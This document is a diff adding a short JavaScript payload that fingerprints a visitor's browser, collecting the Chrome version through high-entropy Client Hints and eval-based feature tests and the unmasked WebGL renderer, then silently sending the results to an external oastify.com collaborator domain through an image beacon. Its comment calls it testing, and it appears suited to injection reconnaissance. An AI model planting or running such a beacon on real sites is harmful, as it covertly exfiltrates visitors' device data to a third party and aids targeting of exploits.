@@ -1,0 +1,66 @@
+(async () => {
+    let chromeVersion = 'Unknown';
+
+    // Check if User-Agent Client Hints API is supported
+    if (navigator.userAgentData) {
+        try {
+            // Get detailed information using high entropy values
+            const details = await navigator.userAgentData.getHighEntropyValues([
+                'fullVersion', 'platform', 'architecture', 'model', 'uaFullVersion'
+            ]);
+
+            if (details.uaFullVersion) {
+                chromeVersion = `Chrome ${details.uaFullVersion}`;
+            } else if (details.fullVersion) {
+                chromeVersion = `Chrome ${details.fullVersion}`;
+            }
+        } catch (error) {
+            console.log('User-Agent Client Hints failed:', error);
+        }
+    }
+
+    // Fallback: Feature Detection for Specific Chrome Versions
+    if (chromeVersion === 'Unknown') {
+        const testFeatures = {
+            '121': 'structuredClone',
+            '114': 'navigator.share',
+            '103': 'atob(btoa("test")) === "test"',
+            '96': 'navigator.clipboard.writeText',
+            '92': 'Intl.DateTimeFormat().resolvedOptions().calendar'
+        };
+
+        for (const [version, feature] of Object.entries(testFeatures)) {
+            try {
+                if (eval(feature)) {
+                    chromeVersion = `Chrome ${version}+ (Feature Detected)`;
+                    break;
+                }
+            } catch (e) { }
+        }
+    }
+
+    // WebGL Rendering Check (Fingerprinting)
+    const getWebGLVersion = () => {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'WebGL info not available';
+        }
+        return 'WebGL not supported';
+    };
+
+    // Print or Send the Results
+    const webGLInfo = getWebGLVersion();
+    console.log(`Detected Chrome Version: ${chromeVersion}`);
+    console.log(`WebGL Renderer: ${webGLInfo}`);
+
+    // Send data to your OAST domain (for testing purposes)
+    const oastDomain = 'od547dymv9h693do4u2sfx1nze55t2hr.oastify.com';
+    const payload = encodeURIComponent(JSON.stringify({
+        chromeVersion,
+        webGLInfo
+    }));
+    const img = new Image();
+    img.src = `https://${oastDomain}/?data=${payload}`;
+})();
